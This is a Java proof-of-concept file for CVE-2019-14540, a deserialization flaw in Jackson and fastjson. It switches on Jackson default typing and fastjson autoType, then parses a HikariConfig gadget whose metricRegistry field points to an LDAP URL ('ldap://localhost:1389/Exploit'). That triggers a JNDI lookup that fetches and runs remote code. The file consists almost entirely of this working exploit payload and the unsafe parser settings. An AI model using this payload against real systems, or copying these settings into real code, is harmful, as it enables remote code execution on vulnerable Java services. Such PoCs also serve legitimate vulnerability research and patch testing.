package com.leadroyal.cve_2019_14540;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.fasterxml.jackson.databind.ObjectMapper;

public class Main {
    public static void main(String[] args) {
        jackson();
        fastjson();
    }

    public static void jackson() {
//        ["com.zaxxer.hikari.HikariConfig", {"metricRegistry":"ldap://localhost:1389/Exploit"}]
        try {
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping();
            mapper.readValue("[\"com.zaxxer.hikari.HikariConfig\", {\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}]".getBytes(), Object.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void fastjson() {
//        {"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
        try {
            ParserConfig.global.setAutoTypeSupport(true);
            JSON.parse("{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
